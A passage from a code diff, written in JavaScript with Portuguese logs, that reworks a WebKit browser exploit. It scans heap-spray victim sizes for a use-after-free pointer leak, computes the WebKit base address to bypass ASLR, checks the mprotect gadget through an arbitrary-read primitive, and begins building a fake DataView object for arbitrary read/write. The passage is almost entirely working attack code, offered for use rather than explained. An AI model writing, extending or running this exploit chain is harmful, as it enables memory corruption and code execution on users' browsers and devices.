-                        logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
-                        break; // Sai do loop de tentativas UAF, pois o vazamento foi bem-sucedido
-                    } else {
-                         logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto. (Tamanho: ${toHex(currentVictimSizeBytes)})`, "warn");
-                         current_uaf_attempt_success = false; // Falhou na validação do gadget
-                         if (attempt === UAF_ATTEMPTS) break; // Sai do loop de tentativas para testar o próximo tamanho
-                         continue;
-                    }
+                if (uaf_result.success) {
+                    logFn(`[SCANNER] SUCESSO no vazamento de ponteiro para VICTIM_SIZE_BYTES = ${toHex(size)}!`, "good", "SCANNER");
+                    best_victim_size_found = size;
+                    best_leaked_double = uaf_result.leaked_double;
+                    current_size_uaf_success = true;
+                    break; // Sai do loop de tentativas para o tamanho atual
                 } else {
-                    logFn(`[UAF LEAK] Ponteiro vazado do UAF é inválido (double) ou não taggeado. Provável falha de reocupação do heap. (Tamanho: ${toHex(currentVictimSizeBytes)})`, "error");
-                    if (attempt === UAF_ATTEMPTS) break; // Sai do loop de tentativas para testar o próximo tamanho
+                    logFn(`[SCANNER] Falha na tentativa UAF #${attempt} para tamanho ${toHex(size)}.`, "warn", "SCANNER");
                 }
-            } // Fim do loop de tentativas UAF para o tamanho atual
-
-            if (current_uaf_attempt_success) {
-                logFn(`SUCESSO: Vazamento de ASLR via UAF/TC FUNCIONOU com VICTIM_SIZE_BYTES = ${toHex(currentVictimSizeBytes)}!`, "good", FNAME_CURRENT_TEST_BASE);
-                break; // Sai do loop do scanner, pois encontrou um tamanho de trabalho
-            } else {
-                logFn(`FALHA: Vazamento de ASLR via UAF/TC NÃO FUNCIONOU com VICTIM_SIZE_BYTES = ${toHex(currentVictimSizeBytes)}. Tentando o próximo tamanho.`, "error", FNAME_CURRENT_TEST_BASE);
-                // Limpa global_spray_objects para a próxima iteração do scanner, para evitar exaustão de memória ao criar muitos objetos.
-                // Apenas se o UAF não foi bem-sucedido com este tamanho.
-                global_spray_objects = [];
-                hold_objects = [];
-                await triggerGC(logFn, pauseFn); // Força GC para limpar tudo antes da próxima iteração do scanner
-                await pauseFn(LOCAL_LONG_PAUSE); // Pausa mais longa entre os tamanhos testados
             }
-        } // Fim do loop do scanner de tamanhos
 
-        if (!current_uaf_attempt_success) {
-            final_result.message = "Vazamento de ASLR via UAF/TC falhou após testar todos os tamanhos de vítima. Abortando exploração.";
-            logFn(final_result.message, "critical");
-            throw new Error(final_result.message);
+            if (current_size_uaf_success) {
+                logFn(`[SCANNER] Tamanho de vítima encontrado: ${toHex(best_victim_size_found)} bytes. Interrompendo scanner.`, "good", "SCANNER");
+                break; // Sai do loop do scanner, pois um tamanho funcional foi encontrado
+            } else {
+                logFn(`[SCANNER] Todas as tentativas falharam para VICTIM_SIZE_BYTES = ${toHex(size)}. Prosseguindo para o próximo tamanho.`, "error", "SCANNER");
+            }
+        } // Fim do loop do scanner
+
+        if (best_victim_size_found === -1) {
+            const errMsg = "Falha crítica: Nenhum tamanho de VICTIM_SIZE_BYTES resultou em um vazamento UAF bem-sucedido após escanear a faixa. Abortando exploração.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+
+        // Se chegamos aqui, um tamanho de vítima funcional foi encontrado.
+        logFn(`SUCESSO GERAL: Vazamento de ASLR via UAF/TC concluído para VICTIM_SIZE_BYTES = ${toHex(best_victim_size_found)}.`, "good");
+
+        // Calcular a base WebKit a partir do melhor vazamento encontrado
+        let untagged_uaf_addr = _doubleToInt64_direct(best_leaked_double);
+        const original_high = untagged_uaf_addr.high();
+        const untagged_high = original_high & 0x0000FFFF;
+        untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
+        logFn(`Endereço vazado (untagged) do UAF: ${untagged_uaf_addr.toString(true)}`, "leak");
+
+        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
+
+        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada mesmo após vazamento bem-sucedido. Abortando exploração.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
+
+        // Verificação de gadget com a base ASLR real
+        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
+        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
+        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
+
+        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+        } else {
+             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
+             // Prossiga, mas com cautela, pois a validação do gadget falhou.
         }
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
+        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---
         logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
 
         const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
@@ -673,35 +678,25 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             details: {
                 webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                 mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
-                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A",
-                successfulVictimSize: webkit_base_address ? toHex(currentVictimSizeBytes) : "N/A"
+                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
             }
         };
-        // Sai do loop do scanner se o exploit completo for bem-sucedido
-        break;
 
     } catch (e) {
         final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
         final_result.success = false;
         logFn(final_result.message, "critical");
-        // Não re-lançar o erro aqui para permitir que o scanner continue, a menos que seja um erro crítico irrecuperável.
-        // O loop do scanner já tem uma lógica para quebrar em caso de falha de primitivas essenciais.
     } finally {
-        // Limpeza final para cada iteração do scanner
-        // Global_spray_objects NÃO é limpo aqui para ser reutilizado
-        hold_objects = []; // Apenas limpa os objetos específicos desta iteração UAF
+        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
+        global_spray_objects = [];
+        hold_objects = [];
+
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
-        logFn(`Limpeza após iteração do scanner concluída.`, "info");
+        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
     }
 
-    // Reporta o resultado final do scanner
-    if (!final_result.success) {
-        logFn(`--- SCANNER FINAL: Todas as tentativas de tamanho falharam. Resultado final: FALHA ---`, "test");
-        logFn(`Mensagem final: ${final_result.message}`, 'critical');
-    } else {
-        logFn(`--- SCANNER FINAL: Exploit BEM-SUCEDIDO com VICTIM_SIZE_BYTES = ${final_result.details.successfulVictimSize} ---`, "test");
-        logFn(`Mensagem final: ${final_result.message}`, 'good');
-    }
+    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
+    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
     if (final_result.details) {
         logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
     }
